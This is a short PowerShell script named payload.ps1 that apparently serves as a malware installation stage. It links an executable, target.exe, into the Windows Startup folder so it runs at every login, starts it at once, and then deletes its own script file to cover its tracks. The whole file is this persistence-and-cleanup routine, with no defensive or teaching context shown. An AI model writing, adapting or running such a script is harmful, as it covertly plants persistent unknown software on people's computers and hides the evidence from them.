# payload.ps1

$source = "C:\Users\Public\teleportScroll\teleportScroll-main\dist\target.exe"
$shortcut = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\target.exe"
cmd /c mklink `"$shortcut`" `"$source`"
Start-Process -FilePath $source
Remove-Item 'C:\Users\Public\teleportScroll\teleportScroll-main\payload.ps1' -Force
